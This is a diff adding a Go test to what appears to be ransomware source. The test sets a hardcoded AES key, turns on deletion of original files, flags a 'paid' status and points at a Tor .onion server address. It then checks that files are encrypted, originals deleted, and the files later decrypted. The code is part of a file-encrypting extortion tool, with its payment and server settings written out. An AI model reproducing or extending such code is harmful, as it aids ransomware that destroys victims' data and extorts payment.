@@ -274,3 +274,42 @@ func TestOfflineDecryption(t *testing.T) {
 	}
 	tearDown()
 }
+
+func TestEncryptionDecryptionSchemaTor(t *testing.T) {
+	files, rootDir := createRecursiveFileHierarchy(t)
+	var dQue utils.Queue
+	utils.Settings.SuppliedAESKey = "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
+	dQue.Init(files)
+	utils.Settings.Delete = true
+	utils.Settings.RawKey = false
+	utils.Settings.PaidStatus = true
+	utils.Settings.OfflineMode = false
+	utils.Settings.TorAddress = "http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:88"
+	StartEncryption(&dQue, key)
+	for _, f := range files {
+		_, b := os.Stat(f)
+		if b == nil {
+			t.Errorf("Filed should be deleted")
+		}
+	}
+	var eQue utils.Queue
+	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
+	eQue.Init(eFiles)
+	// prepare decrypted key
+	// ioutil.WriteFile("./d_key.txt", []byte(utils.Settings.SuppliedAESKey), 0777)
+	StartDecryption(&eQue, key)
+	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
+	for _, ff := range files {
+		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
+			t.Error("Final array mismatch")
+		}
+		content, err := ioutil.ReadFile(ff)
+		if err != nil {
+			log.Fatal("Failed to read decrypted file")
+		}
+		if string(content) != "This is a test string" {
+			t.Error("Decrypted content mismatch")
+		}
+	}
+	tearDown()
+}
